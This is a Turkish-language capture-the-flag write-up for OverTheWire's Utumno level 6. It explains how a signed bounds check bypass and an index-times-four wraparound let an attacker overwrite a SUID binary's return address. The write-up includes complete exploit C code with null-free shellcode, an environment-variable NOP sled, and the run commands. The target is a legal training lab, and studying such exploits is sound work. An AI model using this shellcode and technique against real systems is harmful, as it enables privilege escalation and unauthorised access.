# OverTheWire — Utumno Level 6 Çözümü (utumno6 → utumno7)

> Hedef: `utumno6` kullanıcısından `utumno7` kullanıcısının şifresini elde etmek.
> Teknik: **signed sınır kontrolü bypass + integer (×4) overflow** ile keyfi yazma →
> return adresini doğrudan ez; executable stack'te env-var shellcode + gömülü `cat`.

---

## 1. Bağlantı

```bash
ssh utumno6@utumno.labs.overthewire.org -p 2227
# şifre: **********   (bir önceki seviyeden)
```

---

## 2. Keşif (Recon)

```bash
ls -la /utumno/utumno6
# -r-sr-x--- 1 utumno7 utumno6 13212 utumno6   <-- SUID utumno7, grup utumno6 = OKUNABİLİR
strings /utumno/utumno6
#   malloc, strtoul, strcpy, printf
#   "Missing args", "Illegal position in table, quitting..",
#   "Table position %d has value %d", "Description: %s"
#   ... -fno-stack-protector ...                <-- canary YOK
readelf -l /utumno/utumno6 | grep GNU_STACK     #   RWE -> stack EXECUTABLE
```

---

## 3. Statik Analiz — `main`

```bash
objdump -d -M intel /utumno/utumno6 | sed -n '/<main>:/,/^$/p'
```

Sözde kod:
```c
int main(int argc, char **argv) {
    int table[?];                          // ebp-0x30
    if (argc <= 2) { puts("Missing args"); exit(1); }       // argc >= 3 gerekli
    void *ptr = malloc(0x20);
    if (!ptr) { puts("Sorry, ran out of memory"); exit(1); }
    unsigned value    = strtoul(argv[2], NULL, 16);         // [ebp-0x4]
    unsigned position = strtoul(argv[1], NULL, 10);         // [ebp-0x8]
    if ((int)position > 10) { puts("Illegal position..."); exit(1); }   // SIGNED kontrol!
    table[position] = value;               // mov [ebp + position*4 - 0x30], value
    strcpy(ptr, argv[3]);                  // heap'e kopya (zararsız)
    printf("Table position %d has value %d\nDescription: %s\n", position, table[position], ptr);
    return 0;
}
```

### İki zafiyet birleşiyor
1. **Signed sınır kontrolü:** `if ((int)position > 10) exit;` → `position` **işaretli** kıyaslanıyor.
   Büyük bir unsigned (yüksek bit set) **negatif** görünür → `≤ 10` testini geçer.
2. **`table[position] = value`** ⇒ `mov [ebp + position*4 - 0x30], value` → keyfi (relative) yazma.

### Return adresine yazma — `×4` wraparound
Return adresi `ebp+4`. İstenen: `ebp + position*4 - 0x30 = ebp+4` ⇒ `position*4 ≡ 0x34 (mod 2^32)`.
- `position = 0xD (13)` doğrudan `0x34` verir ama `13 > 10` → kontrol patlar.
- **`position = 0x8000000D = 2147483661`**:
  - signed = `-2147483635` → `≤ 10` ⇒ **kontrol geçer**.
  - `position*4 = 0x200000034` → 32-bit'e kırpılır = **`0x34`** ⇒ yazma adresi `ebp+4` = **return adresi!**

⇒ `argv[1] = "2147483661"`, `argv[2] = <hex EGG sled adresi>` → return adresi = shellcode.
Bu seviyede argv **normal** (argc≥3) — argc-hilesi gerekmez.

---

## 4. Final Exploit

`argv = {"/utumno/utumno6", "2147483661", "<hex>", "x"}`; `envp = {EGG=sled+shellcode, NULL}`.

### `ex6.c`
```c
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
unsigned char sc[]={ /* null-free: setreuid; execve /bin/sh -c "cat .../utumno7" */
 0x31,0xc0,0xb0,0xc9,0xcd,0x80,0x89,0xc3,0x89,0xc1,0x31,0xc0,0xb0,0xcb,0xcd,0x80,
 0x31,0xc0,0x50,
 0x68,0x6d,0x6e,0x6f,0x37, 0x68,0x2f,0x75,0x74,0x75, 0x68,0x70,0x61,0x73,0x73,
 0x68,0x6d,0x6e,0x6f,0x5f, 0x68,0x2f,0x75,0x74,0x75, 0x68,0x2f,0x65,0x74,0x63,
 0x68,0x63,0x61,0x74,0x20, 0x89,0xe6,
 0x31,0xc0,0x50, 0x66,0xc7,0x04,0x24,0x2d,0x63, 0x89,0xe7,
 0x31,0xc0,0x50, 0x68,0x2f,0x2f,0x73,0x68, 0x68,0x2f,0x62,0x69,0x6e, 0x89,0xe5,
 0x31,0xc0,0x50,0x56,0x57,0x55, 0x89,0xe1,0x89,0xeb,0x31,0xd2,0x31,0xc0,0xb0,0x0b,0xcd,0x80};
#define SLED 60000
static char eggenv[4+SLED+256];
static char *envp[2];
int main(int argc,char**argv){
 memcpy(eggenv,"EGG=",4); memset(eggenv+4,0x90,SLED);
 memcpy(eggenv+4+SLED,sc,sizeof sc); eggenv[4+SLED+sizeof sc]=0;
 envp[0]=eggenv; envp[1]=0;
 if(argc>=2 && !strcmp(argv[1],"find")){
   char *av[]={"/tmp/q7Bn3kLm9z","2147483661","41414141","x",0}; execve("/tmp/q7Bn3kLm9z",av,envp);
 } else if(argc>=3 && !strcmp(argv[1],"run")){
   char *av[]={"/utumno/utumno6","2147483661",argv[2],"x",0}; execve("/utumno/utumno6",av,envp);
 }
 perror("execve"); return 1;
}
```

### `pr.c`
```c
#include <stdio.h>
extern char **environ;
int main(){ printf("ENVADDR=%p\n",(void*)environ[0]); return 0; }
```

### Çalıştırma
```bash
gcc -m32 -o ex6 ex6.c
gcc -m32 -o /tmp/q7Bn3kLm9z pr.c        # 15-char path, TAZE (önceki seviye sahipliği çakışmasın)

ENV0=$(./ex6 find | sed -n 's/.*ENVADDR=0x\([0-9a-f]*\).*/\1/p')
RET=$(python3 -c "print('%x'%(int('$ENV0',16)+4+30000))")
./ex6 run "$RET"        # table[0x8000000D]=RET -> ret ezilir -> sled -> cat
```

Çıktı:
```
ENV0=fffef51f RET=ffff6a53
Table position -2147483635 has value -38317
Description: x
**********
```
(`value -38317` = `0xffff6a53`'in signed gösterimi — taşma yazımının kanıtı.)

---

## 5. Doğrulama

```bash
ssh utumno7@utumno.labs.overthewire.org -p 2227
# şifre: **********
```
```
uid=16007(utumno7) gid=16007(utumno7) groups=16007(utumno7)
$ cat /etc/utumno_pass/utumno7
**********
```
✅ Başarılı.

---

## Özet / Alınan Dersler

| Konu | Not |
|------|-----|
| **Signed bounds bypass** | `(int)position > 10` kontrolü; yüksek-bit'li unsigned negatif görünür → geçer |
| **Dizi indeksi = keyfi yazma** | `table[position]=value` → `mov [ebp+position*4-0x30], value` |
| **`×4` wraparound** | `position=0x8000000D` → `*4 mod 2^32 = 0x34` → tam `ebp+4` (return adresi) |
| **argv normal** | argc≥3 yeter; bu sefer argc-hilesine gerek yok |
| **Taze /tmp path** | Önceki seviyenin sahipliğiyle çakışmamak için yeni 15-char printer path |
